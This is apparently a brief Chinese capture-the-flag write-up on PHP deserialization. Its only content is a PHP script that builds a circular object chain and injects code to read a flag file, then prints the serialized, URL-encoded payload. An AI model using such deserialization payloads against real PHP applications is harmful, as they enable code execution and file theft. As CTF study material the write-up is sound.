# 知识点
php反序列化
# 思路
```php
<?php  
    class NISA{
        public $fun;
        public $txw4ever;
    }
    class Ilovetxw{
        public $su;

    }
    $a = new NISA();
    $b = new Ilovetxw();
    $b->su = $a;
    $a->fun = $b;
    $a->txw4ever = 'echo (fread(fopen("/fllllllaaag","r"), 1024));';
    echo urlencode(serialize($a));

```
